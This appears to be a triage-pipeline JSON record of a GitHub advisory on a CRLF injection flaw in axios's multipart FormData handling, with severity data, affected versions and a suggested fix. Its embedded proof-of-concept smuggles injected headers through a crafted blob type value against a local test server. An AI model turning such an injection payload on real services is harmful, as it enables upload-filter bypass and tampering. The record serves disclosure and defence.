@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/20946532?v=4\", \"events_url\": \"https://api.github.com/users/kobi-s/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/kobi-s/followers\", \"following_url\": \"https://api.github.com/users/kobi-s/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/kobi-s/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/kobi-s\", \"id\": 20946532, \"login\": \"kobi-s\", \"node_id\": \"MDQ6VXNlcjIwOTQ2NTMy\", \"organizations_url\": \"https://api.github.com/users/kobi-s/orgs\", \"received_events_url\": \"https://api.github.com/users/kobi-s/received_events\", \"repos_url\": \"https://api.github.com/users/kobi-s/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/kobi-s/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/kobi-s/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/kobi-s\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42037\", \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-93\", \"name\": \"Improper Neutralization of CRLF Sequences ('CRLF Injection')\"}], \"description\": \"### Summary\\nThe `FormDataPart` constructor in `lib/helpers/formDataToStream.js` interpolates `value.type` directly into the `Content-Type` header of each multipart part without sanitizing CRLF (`\\\\r\\\\n`) sequences. An attacker who controls the `.type` property of a Blob/File-like object (e.g., via a user-uploaded file in a Node.js proxy service) can inject arbitrary MIME part headers into the multipart form-data body. This bypasses Node.js v18+ built-in header protections because the injection targets the multipart body structure, not HTTP request headers.\\n\\n### Details\\nIn `lib/helpers/formDataToStream.js` at line 27, when processing a Blob/File-like value, the code builds per-part headers by directly embedding value.type:\\n```\\nif (isStringValue) {\\n  value = textEncoder.encode(String(value).replace(/\\\\r?\\\\n|\\\\r\\\\n?/g, CRLF));\\n} else {\\n  // value.type is NOT sanitized for CRLF sequences\\n  headers += `Content-Type: ${value.type || 'application/octet-stream'}${CRLF}`;\\n}\\n```\\nNote that the string path (line above) explicitly sanitizes CRLF, but the binary/blob path does not. This inconsistency confirms the sanitization was intended but missed for `value.type`.\\n\\n\\n### Attack chain:\\n\\n1. Attacker uploads a file to a Node.js proxy service, supplying a crafted MIME type containing `\\\\r\\\\n` sequences\\n2. The proxy appends the file to a FormData and posts it via `axios.post(url, formData)`\\n3. axios calls `formDataToStream()`, which passes `value.type` unsanitized into the multipart body\\n4. The downstream server receives a multipart body containing injected per-part headers\\n5. The server's multipart parser processes the injected headers as legitimate\\n\\nThis is reachable via the fully public axios API (`axios.post(url, formData)`) with no special configuration.\\nAdditionally, `value.name` used in the `Content-Disposition` construction nearby likely has the same issue and should be audited.\\n\\n### PoC\\n**Prerequisites**: Node.js 18+, axios (tested on 1.14.0)\\n```\\nconst http = require('http');\\nconst axios = require('axios');\\n\\nlet receivedBody = '';\\n\\nconst server = http.createServer((req, res) => {\\n  let body = '';\\n  req.on('data', chunk => { body += chunk.toString(); });\\n  req.on('end', () => {\\n    receivedBody = body;\\n    res.writeHead(200);\\n    res.end('ok');\\n  });\\n});\\n\\nserver.listen(0, '127.0.0.1', async () => {\\n  const port = server.address().port;\\n\\n  class SpecFormData {\\n    constructor() {\\n      this._entries = [];\\n      this[Symbol.toStringTag] = 'FormData';\\n    }\\n    append(name, value) { this._entries.push([name, value]); }\\n    [Symbol.iterator]() { return this._entries[Symbol.iterator](); }\\n    entries() { return this._entries[Symbol.iterator](); }\\n  }\\n\\n  const fd = new SpecFormData();\\n\\n  fd.append('photo', {\\n    type: 'image/jpeg\\\\r\\\\nX-Injected-Header: PWNED-by-attacker\\\\r\\\\nX-Evil: arbitrary-value',\\n    size: 16,\\n    name: 'photo.jpg',\\n    [Symbol.asyncIterator]: async function*() {\\n      yield Buffer.from('MALICIOUS PAYLOAD');\\n    }\\n  });\\n\\n  await axios.post(`http://127.0.0.1:${port}/upload`, fd);\\n\\n  if (receivedBody.includes('X-Injected-Header: PWNED-by-attacker')) {\\n    console.log('[VULNERABLE] CRLF injection confirmed in multipart body');\\n    console.log('Received body:\\\\n' + receivedBody);\\n  } else {\\n    console.log('[NOT_VULNERABLE]');\\n  }\\n\\n  server.close();\\n});\\n```\\n\\n### Steps to reproduce:\\n\\n1. npm install axios\\n2. Save the above as poc_axios_crlf.js\\n3. Run node poc_axios_crlf.js\\n4. Observe the output shows [VULNERABLE] with injected headers visible in the multipart body\\n\\n**Expected behavior**: value.type should be sanitized to strip \\\\r\\\\n before interpolation, consistent with the string value path.\\n**Actual behavior**: CRLF sequences in value.type are preserved, allowing arbitrary header injection in multipart parts.\\n\\n### Impact\\nAny Node.js application that accepts user-provided files (with attacker-controlled MIME types) and re-posts them via axios FormData is affected. This is a common pattern in proxy services, file upload relays, and API gateways.\\nConsequences include: bypassing server-side Content-Type-based upload filters, confusing multipart parsers into misrouting data, injecting phantom form fields if the boundary is known, and exploiting downstream server vulnerabilities that trust per-part headers.\\naxios is one of the most downloaded npm packages, significantly increasing the blast radius of this issue.\\n\\n### Suggested fix\\nIn formDataToStream.js, sanitize value.type before interpolating it into the per-part Content-Type header. Apply the same strategy used for string values (strip/replace \\\\r\\\\n) or use the same escapeName logic.\\n```\\nconst safeType = (value.type || 'application/octet-stream')\\n  .replace(/[\\\\r\\\\n]/g, '');\\nheaders += `Content-Type: ${safeType}${CRLF}`;\\n```\", \"epss\": {\"percentage\": 0.0024, \"percentile\": 0.149}, \"ghsa_id\": \"GHSA-445q-vr5w-6q77\", \"github_reviewed_at\": \"2026-05-05T00:40:45Z\", \"html_url\": \"https://github.com/advisories/GHSA-445q-vr5w-6q77\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-445q-vr5w-6q77\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42037\"}], \"nvd_published_at\": \"2026-04-24T18:16:30Z\", \"published_at\": \"2026-05-05T00:40:45Z\", \"references\": [\"https://github.com/axios/axios/security/advisories/GHSA-445q-vr5w-6q77\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42037\", \"https://github.com/advisories/GHSA-445q-vr5w-6q77\"], \"repository_advisory_url\": \"https://api.github.com/repos/axios/axios/security-advisories/GHSA-445q-vr5w-6q77\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/axios/axios\", \"summary\": \"Axios: CRLF Injection in multipart/form-data body via unsanitized blob.type in formDataToStream\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-05T00:40:46Z\", \"url\": \"https://api.github.com/advisories/GHSA-445q-vr5w-6q77\", \"vulnerabilities\": [{\"first_patched_version\": \"1.15.1\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"axios\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.0.0, < 1.15.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-445q-vr5w-6q77",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "axios: >= 1.0.0, < 1.15.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-42037"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "axios"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.054152Z",
+  "provenance": {
+    "content_sha256": "bd759dafe5608cd412da0f0026f9ebd67da5465e8aa4275bcf74eca2e0f22244",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-05T00:40:45Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-445q-vr5w-6q77",
+  "status": "active",
+  "title": "Axios: CRLF Injection in multipart/form-data body via unsanitized blob.type in formDataToStream",
+  "updated_at": "2026-05-05T00:40:46Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-445q-vr5w-6q77"
+}
